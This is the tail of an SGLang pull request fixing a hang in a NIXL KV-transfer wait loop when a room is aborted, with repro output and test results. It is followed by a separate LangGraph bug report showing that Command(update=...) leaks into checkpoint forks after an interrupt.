        state["n"] += 1
        if state["n"] == 1:
            return chunk
        raise KeyboardInterrupt()

    worker_done = Event()

    def run_worker():
        try:
            manager.transfer_worker(SimpleNamespace(get=fake_get))
        except KeyboardInterrupt:
            pass
        finally:
            worker_done.set()

    t = Thread(target=run_worker, daemon=True)
    t.start()
    wait_until_polling(agent)
    assert manager._handle_abort_notification(abort_message())
    finished = worker_done.wait(5.0)
    sleep(0.1)
    print(
        {
            "worker_finished_within_5s_after_abort": finished,
            "outstanding_after_abort": manager._staging_outstanding.get(ROOM, 0),
            "abort_ack_sent_after_abort": bool(manager.sent_acks),
            "acks": [(r, str(tgt)) for r, tgt in manager.sent_acks],
            "room_status": str(manager.request_status.get(ROOM)),
        }
    )
    agent.state = "DONE"
    worker_done.wait(3)
    t.join(2)


if __name__ == "__main__":
    phase_a()
    phase_b()
```

</details>

Output **before** this fix (unpatched `main`):

```
=== Phase A: direct _await_handles vs abort ===
{'waiter_returned_within_2s_after_abort': False, 'waiter_alive_after_abort': True, 'return_value': None, 'reads_before_abort': 1, 'reads_after_abort': 36040}
=== Phase B: transfer_worker vs abort (accounting + ACK) ===
{'worker_finished_within_5s_after_abort': False, 'worker_exception': 'None', 'outstanding_after_abort': 1, 'abort_ack_sent_after_abort': False, 'acks': [], 'room_status': '0', 'room_poisoned': False}
```

Output **after** this fix:

```
=== Phase A: direct _await_handles vs abort ===
{'waiter_returned_within_2s_after_abort': True, 'waiter_alive_after_abort': False, 'return_value': (False, False, True), 'reads_before_abort': 1, 'reads_after_abort': 1}
=== Phase B: transfer_worker vs abort (accounting + ACK) ===
{'worker_finished_within_5s_after_abort': True, 'worker_exception': 'None', 'outstanding_after_abort': 0, 'abort_ack_sent_after_abort': True, 'acks': [(90210, "AckTarget(ip='127.0.0.1', port=54321, generation=7)")], 'room_status': '0', 'room_poisoned': False}
```

(`room_status: '0'` is `KVPoll.Failed` in both runs — the abort notification's
status flip is preserved; the worker no longer touches it.)

## Accuracy Tests

- New regression tests in
  `test/registered/unit/disaggregation/test_nixl_deferred_kv_release.py`:
  `test_await_handles_wakes_when_room_aborted_mid_wait` and
  `test_abort_during_handle_wait_releases_worker_and_acks` — both pass, and
  the first fails on unpatched code (the wait never returns).
- Existing suites, all passing:
  - `test_nixl_deferred_kv_release.py`: 9 passed, 6 subtests passed
  - `test_deferred_decode_kv_release.py` + `test_nixl_backend_basic.py`:
    96 passed, 4 subtests passed
- `ruff check` and `ruff format --check` clean on both touched files.

## Speed Tests and Profiling

Not applicable: this changes a control-plane wait loop only. The added
per-iteration check is a single dict lookup next to the existing per-handle
`check_xfer_state` polling.

## Checklist

- [x] Format your code according to the [Format code with pre-commit](https://docs.sglang.io/developer_guide/contribution_guide.html#format-code-with-pre-commit).
- [x] Add unit tests according to the [Run and add unit tests](https://docs.sglang.io/developer_guide/contribution_guide.html#run-and-add-unit-tests).
- [ ] Update documentation according to [Write documentations](https://docs.sglang.io/developer_guide/contribution_guide.html#write-documentations). (No user-facing behavior change.)
- [ ] Provide accuracy and speed benchmark results according to [Test the accuracy](https://docs.sglang.io/developer_guide/contribution_guide.html#test-the-accuracy) and [Benchmark the speed](https://docs.sglang.io/developer_guide/contribution_guide.html#benchmark-the-speed). (Control-plane fix; no model-output or perf path touched.)
- [x] Follow the SGLang code style [guidance](https://docs.sglang.io/developer_guide/contribution_guide.html#code-style-guidance).

## Notes

- This PR is not a duplicate: I checked the issue timeline, comments, and open
  PRs in sgl-project/sglang for overlapping fixes (including keyword searches
  for `_await_handles` / nixl abort paths) before opening. The closest related
  PR, #36707 ("[PD][NIXL] Prevent abort ACK with unresolved errored
  transfers"), targets a different code path (Failed-room skip defeating the
  drain invariant when the NIXL DONE barrier exits on `ERR`); this fix targets
  a room aborted while its handles are still healthy and non-terminal (`PROC`),
  where the settle deadline is never armed.
- The single commit is DCO-signed (`Signed-off-by: Kylinny
  <64238008+Kylinny@users.noreply.github.com>`).

issue.title: Time travel to an interrupt reapplies the Command(update=...) of the old branch
issue.body:
### Checked other resources

- [x] This is a bug, not a usage question.
- [x] I added a clear and descriptive title that summarizes this issue.
- [x] I used the GitHub search to find a similar question and didn't find it.
- [x] I am sure that this is a bug in LangGraph rather than my code.
- [x] The bug is not resolved by updating to the latest stable version of LangGraph (or the specific integration package).
- [x] This is not related to the langchain-community package.
- [x] I posted a self-contained, minimal, reproducible example. A maintainer can copy it and run it AS IS.

### Related Issues / PRs

#8443, fixed by #8548 for `DeltaChannel` forks only. That PR says plain channels are unaffected; the channel here is a plain `operator.add`.

### Reproduction Steps / Example Code (Python)

```python
import operator
from typing import Annotated, TypedDict
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph import START, StateGraph
from langgraph.types import Command, interrupt

class S(TypedDict):
    log: Annotated[list, operator.add]

g = StateGraph(S)
g.add_node("a", lambda s: {"log": ["a"]})
g.add_node("b", lambda s: {"log": ["b:" + interrupt("ok?")]})
g.add_edge(START, "a")
g.add_edge("a", "b")
app = g.compile(checkpointer=InMemorySaver())
cfg = {"configurable": {"thread_id": "1"}}

app.invoke({"log": ["x"]}, cfg)
c = app.get_state(cfg).config
print(app.get_state(c).values["log"])
# ['x', 'a']

app.invoke(Command(resume="yes", update={"log": ["edit"]}), cfg)
print(app.get_state(c).values["log"])
# ['x', 'a', 'edit'], should be ['x', 'a']

app.invoke(None, c)
print(app.invoke(Command(resume="no"), cfg)["log"])
# ['x', 'a', 'edit', 'b:no'], should be ['x', 'a', 'b:no']
# the fork from c interrupts again, so the resume value is dropped but the update is not
```

### Error Message and Stack Trace (if applicable)

```shell

```

### Description

Currently, `Command(update=...)` is stored as null-task pending writes on the checkpoint it resumes, so `get_state` on that checkpoint and every later fork from it apply the update, while the `resume` value stored beside it is dropped. A thread resumed without `update` keeps `['x', 'a']` at the same checkpoint.

`interrupt_before=["b"]` with `Command(update=...)` and no `resume` leaks the same way, into `invoke(None, c)` and into `invoke(new_input, c)`. `SqliteSaver` and `PostgresSaver` print the same.

### System Info

macOS 26.7.1, arm64 (Darwin 25.6.0)
Python 3.12.16
langgraph 1.2.18, langgraph-checkpoint 4.3.1, langgraph-checkpoint-sqlite 3.1.2, langgraph-checkpoint-postgres 3.2.0
PostgreSQL 18.6
